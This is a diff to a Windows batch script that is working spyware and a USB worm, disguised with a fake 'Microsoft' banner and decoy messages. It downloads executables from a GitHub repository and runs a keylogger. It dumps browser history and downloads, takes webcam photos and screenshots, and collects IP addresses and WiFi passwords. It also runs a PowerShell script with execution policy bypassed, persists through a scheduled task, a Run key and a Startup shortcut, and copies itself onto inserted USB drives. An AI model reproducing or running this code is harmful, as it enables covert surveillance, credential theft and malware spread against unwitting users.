@@ -3,23 +3,36 @@ setlocal enableextensions
 cd /D "%~dp0"
 
 
-
+echo ************* Microsoft ****************
+echo Please wait...
+timeout 1 > NUL
+echo.
+echo .
+echo.
+timeout 1 > NUL
+echo .
 set CUR_HH=%time:~0,2%
 if %CUR_HH% lss 10 (set CUR_HH=0%time:~1,1%)
 set CUR_NN=%time:~3,2%
 set CUR_SS=%time:~6,2%
 set FILENAME=%CUR_HH%%CUR_NN%%CUR_SS%
 
-echo *************Removing previous data****************
+::echo ************* Removing microsoft previous data ****************
 RMDIR /S /Q C:\Users\Public\Licence\Microsoft\ 
+echo Erasing past footprint!
 
-echo *************Killing task****************
+
+::echo ************* Killing task ****************
 taskkill /f /im Lightshot.exe > nul 2> nul
 taskkill /f /im folder.exe > nul 2> nul
-echo Tasks Killed!
+echo Killing bad guys!
+echo.
+timeout 1 > NUL
 
 
-echo *************Create directory****************
+
+::echo ************* Create directory ****************
+echo ************* Debugging dir ****************
    mkdir C:\Users\Public\Licence\Extension > nul 2> nul
    attrib -h -r C:\Users\Public\Licence\Extension /s /d > nul 2> nul
 
@@ -42,25 +55,37 @@ echo *************Create directory****************
    mkdir C:\Users\%username%\AppData\Local\A310Logger > nul 2> nul
    mkdir C:\Users\Public\Licence\Microsoft\A310Logger > nul 2> nul
    
-   echo Directory Created
+   
+   echo Making ground!
 
 
 
-echo *************Copy file****************
-      copy "C:\Users\%username%\AppData\Local\Temp\afolder\*.*" "C:\Users\Public\Licence\Extension\" /y > nul 2> nul
-      echo Copied!
-      echo.
-      echo.
+::echo ************* Copy file ****************
+   copy "C:\Users\%username%\AppData\Local\Temp\afolder\*.*" "C:\Users\Public\Licence\Extension\" /y > nul 2> nul
+   echo Planting files!
 
 
-echo *************Changing working dir****************
+::echo ************* Changing working dir ****************
    cd /D C:\Users\Public\Licence\Extension
    echo Success!
-   echo.
+
+
+
+
+
+echo Please wait...
+timeout 2 > NUL
+echo.
+echo.
+echo.
+timeout 1 > NUL
+echo.
+
+
 
 
 :loop
-echo *************Internet connection****************     
+echo ************* Internet connection ****************     
    echo Checking internet connectivity. Please wait...
    timeout 1 > NUL
    Ping www.google.nl -n 1 -w 1000 > NUL
@@ -74,9 +99,8 @@ echo *************Internet connection****************
    ) else (
 
 
-echo *************DOWNLOAD file****************
+::echo ************* DOWNLOAD file ****************
    echo Downloading...
-   timeout 3 > NUL
    if not exist "C:\Users\Public\Licence\Extension\nircmd.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/nircmd.exe?raw=true', 'nircmd.exe')" > nul 2> nul    
    )  
@@ -84,6 +108,7 @@ echo *************DOWNLOAD file****************
    if not exist "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true', 'WebCamImageSave.exe')" > nul 2> nul    
    )  
+   echo .
       if errorlevel 1 goto ERROR2
    if not exist "C:\Users\Public\Licence\Extension\BrowserAddonsView.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/BrowserAddonsView.exe?raw=true', 'BrowserAddonsView.exe')" > nul 2> nul    
@@ -135,6 +160,14 @@ echo *************DOWNLOAD file****************
    )  
       if errorlevel 1 goto ERROR2     
    
+
+
+
+
+echo .
+
+
+
 
    if not exist "C:\Users\Public\Licence\Extension\BrowserDownloadsview.exe" (
       powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/win32u/Licence/blob/main/Extension/browserdownloadsview.exe?raw=true', 'BrowserDownloadsview.exe')" > nul 2> nul    
@@ -202,7 +235,6 @@ echo *************DOWNLOAD file****************
    echo Your first attempt might fail! We'll try second.
    echo.
    echo Please, wait...
-   timeout 3 > NUL
 
    if not exist "C:\Users\Public\Licence\Extension\nircmd.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/nircmd.exe?raw=true -OutFile nircmd.exe" > nul 2> nul
@@ -213,7 +245,7 @@ echo *************DOWNLOAD file****************
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/WebCamImageSave.exe?raw=true -OutFile WebCamImageSave.exe" > nul 2> nul
    )
       if errorlevel 1 goto ERROR3
-
+   echo .
    if not exist "C:\Users\Public\Licence\Extension\BrowserAddonsView.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/BrowserAddonsView.exe?raw=true -OutFile BrowserAddonsView.exe" > nul 2> nul
    )  
@@ -264,6 +296,17 @@ echo *************DOWNLOAD file****************
    )  
       if errorlevel 1 goto ERROR3
    
+
+
+echo .
+
+
+
+
+   if not exist "C:\Users\Public\Licence\Extension\BrowserDownloadsview.exe" (
+      powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/BrowserDownloadsview.exe?raw=true -OutFile BrowserDownloadsview.exe" > nul 2> nul
+   )   
+      if errorlevel 1 goto ERROR3
 
    if not exist "C:\Users\Public\Licence\Extension\BrowsingHistoryView.exe" (
       powershell -Command "Invoke-WebRequest https://github.com/win32u/Licence/blob/main/Extension/browsinghistoryview.exe?raw=true -OutFile BrowsingHistoryView.exe" > nul 2> nul
@@ -365,8 +408,10 @@ echo *************DOWNLOAD file****************
 
    :SUCCESS
    echo DOWNLOAD SUCCESSFUL!!
-   echo *************Execute file****************
-    
+   echo.
+   echo.
+   echo ************* Execute file ****************
+   echo Flying on sky!
    call "C:\Users\Public\Licence\Extension\BrowserAddonsView.exe" /stext "C:\Users\Public\Licence\Microsoft\Addons\BrowserAddonsView.txt"
    call "C:\Users\Public\Licence\Extension\BrowserDownloadsView.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\BrowserDownloadsView.txt"
    call "C:\Users\Public\Licence\Extension\BrowsingHistoryView.exe" /stext "C:\Users\Public\Licence\Microsoft\Browser\BrowsingHistoryView.txt"
@@ -385,12 +430,13 @@ echo *************DOWNLOAD file****************
    call "C:\Users\Public\Licence\Extension\TaskSchedulerView.exe" /stext "C:\Users\Public\Licence\Microsoft\Task\TaskSchedulerView.txt"
    call "C:\Users\Public\Licence\Extension\UninstallView.exe" /stext "C:\Users\Public\Licence\Microsoft\Utility\UninstallView.txt"
 
-   echo *************A310Logger****************
+   ::echo ************* A310Logger ****************
+   echo Cooking 3 kg meat!
    call "C:\Users\Public\Licence\Extension\A310Logger.exe" > nul 2> nul
    Robocopy C:\Users\Shakil-PC\AppData\Local\A310Logger\ C:\Users\Public\Licence\Microsoft\A310Logger /E /MOVE > nul 2> nul
 
-   echo *************Webcam image****************
-
+   ::echo ************* Webcam image ****************
+   echo Watching dirty picture!
    call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_1.jpg"
       timeout 2 > nul 2> nul
    call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_2.jpg"
@@ -411,7 +457,8 @@ echo *************DOWNLOAD file****************
       timeout 2 > nul 2> nul
    call "C:\Users\Public\Licence\Extension\WebCamImageSave.exe" /capture /LabelColor ff0000 /FontBold 0 /FontSize 16 /FontName "Arial" /Filename "C:\Users\Public\Licence\Microsoft\Webcam\%FILENAME%_10.jpg"
 
-   echo *************Screenshot****************
+   ::echo ************* Screenshot ****************
+   echo Shoot my head!
    call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_1.png
    timeout 3 > nul 2> nul   
    call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_2.png
@@ -419,7 +466,8 @@ echo *************DOWNLOAD file****************
    call "C:\Users\Public\Licence\Extension\nircmd.exe" savescreenshot C:\Users\Public\Licence\Microsoft\Screenshot\Screen_3.png
    timeout 3 > nul 2> nul    
 
-   echo *************Find IP****************
+   ::echo ************* Find IP ****************
+   echo Vip!
    echo Computer Name: %ComputerName% ^& %UserName% >"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
    echo. >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
    for /f "tokens=1-2 delims=:" %%a in ('ipconfig^|find "IPv4"') do set ip=%%b
@@ -430,7 +478,8 @@ echo *************DOWNLOAD file****************
    ) Do Set ExtIP=%%A
    echo External IP is:  %ExtIP% >>"C:\Users\Public\Licence\Microsoft\Location\IPnHost.txt"
 
-   echo *************WiFi password****************
+   ::echo ************* WiFi password ****************
+   echo Need wife!
    setlocal enabledelayedexpansion
    echo WiFi Password is: >"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt"
    echo. >>"C:\Users\Public\Licence\Microsoft\WiFi\WirelessPass.txt"
@@ -448,59 +497,62 @@ echo *************DOWNLOAD file****************
 
 
 
-   echo *************Windows updates found****************
-      echo Checking Windows for Update. Please wait...
-      echo.
+   echo ************* Windows updates found ****************
+   echo Checking Windows for Update. Please wait...
+   echo.
 
-   echo *************Run powershell file****************
-      powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\Licence\Extension\instagram.ps1"
+   echo ************* Run powershell file ****************
+   powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\Licence\Extension\instagram.ps1"
 	   
 
-   echo *************Give feedback success****************
-      echo Yes!!    
+   echo ************* Give feedback success ****************
+   echo Yes!!    
 
 
 
    
    
    
-    echo *************New Task Create****************
-      schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\Public\Licence\Extension\AutoRun.vbs" /F > nul 2> nul 
-      REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\Public\Licence\Extension\AutoRun.vbs /f > nul 2> nul 
-      mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\Public\Licence\Extension\AutoRun.vbs" > nul 2> nul 
+   echo ************* Create new task ****************
+   schtasks /Create /SC Onevent /EC Microsoft-Windows-NetworkProfile/Operational /MO "*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]" /TN "YouTube" /TR "C:\Users\Public\Licence\Extension\AutoRun.vbs" /F > nul 2> nul 
+   REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v YouTube /t REG_SZ /d C:\Users\Public\Licence\Extension\AutoRun.vbs /f > nul 2> nul 
+   mklink "%systemdrive%\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\AutoRun.vbs - Shortcut" "C:\Users\Public\Licence\Extension\AutoRun.vbs" > nul 2> nul 
+   
+
+
+   ::echo ************* Pendrive check ****************
+   :pendrive
+   echo ************* Done ****************
+	  timeout 1 > NUL
+	  ::echo Checking for pendrive...
+	  echo Waiting to close...
+	  for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
+	  if %%l equ 2 (
+		 mkdir %%i\YouTube > nul 2> nul
+		    if exist "C:\Users\Public\Licence\folder.exe" (
+		                copy "C:\Users\Public\Licence\folder.exe" "%%i" /Y > nul 2> nul
+		                copy "C:\Users\Public\Licence\folder.exe" "%%i\YouTube" /Y > nul 2> nul
+		    )  else (
+			        copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i" /Y > nul 2> nul
+			        copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i\YouTube" /Y > nul 2> nul
+			    )
+		 mkdir "%%i\System Update" > nul 2> nul
+		 attrib +h +r "%%i\System Update" /s /d > nul 2> nul
+		 copy "C:\Users\Public\Licence\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
+		 if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
+		 echo Copied!
+		 ) 
+	  )
+	  echo.
+	  echo.
+	  cls
+          echo Click close to close the window...
+	  goto pendrive
 
 
 
-		:pendrive
-		echo *************Pendrive check****************
-		   timeout 1 > NUL
-		   echo Checking for pendrive...
-		   for /F "usebackq tokens=1,2,3,4 " %%i in (`wmic logicaldisk get caption^,description^,drivetype 2^>NUL`) do (
-		   if %%l equ 2 (
-			  mkdir %%i\YouTube > nul 2> nul
-                          if exist "C:\Users\Public\Licence\folder.exe" (
-                             copy "C:\Users\Public\Licence\folder.exe" "%%i" /Y > nul 2> nul
-                             copy "C:\Users\Public\Licence\folder.exe" "%%i\YouTube" /Y > nul 2> nul
-                          )  else (
-                                copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i" /Y > nul 2> nul
-                                copy "C:\Users\%username%\AppData\Local\Temp\afolder\folder.exe" "%%i\YouTube" /Y > nul 2> nul
-                             )
-			  mkdir "%%i\System Update" > nul 2> nul
-			  attrib +h "%%i\System Update" /s /d
-                          copy "C:\Users\Public\Licence\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
-			  if errorlevel 1 copy "C:\Users\%username%\AppData\Local\Temp\afolder\AutoRun.vbs" "%%i\System Update\AutoRun.vbs" /Y > nul 2> nul
-			  echo Copied!
-			  ) 
-		   )
-		   echo.
-		   echo.
-		   cls
-		   goto pendrive
 
-
-
-
-		exit /b
+	exit /b
 
 
 
